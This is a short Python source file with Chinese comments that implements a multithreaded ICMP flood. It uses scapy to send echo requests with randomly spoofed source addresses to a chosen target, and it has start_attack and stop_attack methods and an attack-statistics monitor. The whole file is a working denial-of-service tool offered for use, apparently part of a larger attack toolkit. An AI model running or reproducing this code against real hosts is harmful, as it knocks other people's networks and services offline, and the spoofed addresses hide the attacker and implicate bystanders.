from scapy.all import IP, ICMP, send
import threading
import random
import time
from utils.monitor import AttackMonitor

class ICMPFlood:
    def __init__(self, target_ip, num_threads=4):
        self.target_ip = target_ip
        self.num_threads = num_threads
        self.running = False
        self.monitor = AttackMonitor()
    
    def generate_random_ip(self):
        return f"{random.randint(1,254)}.{random.randint(1,254)}." \
               f"{random.randint(1,254)}.{random.randint(1,254)}"
    
    def icmp_flood(self):
        while self.running:
            source_ip = self.generate_random_ip()
            
            # 构建ICMP包
            ip_packet = IP(src=source_ip, dst=self.target_ip)
            icmp_packet = ICMP(type=8, code=0)  # Echo Request
            
            try:
                send(ip_packet/icmp_packet, verbose=False)
                self.monitor.update_stats("icmp_flood", 1)
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                print(f"发送失败: {e}")
    
    def start_attack(self):
        self.running = True
        threads = []
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.icmp_flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        return threads
    
    def stop_attack(self):
        self.running = False
        return self.monitor.get_stats() 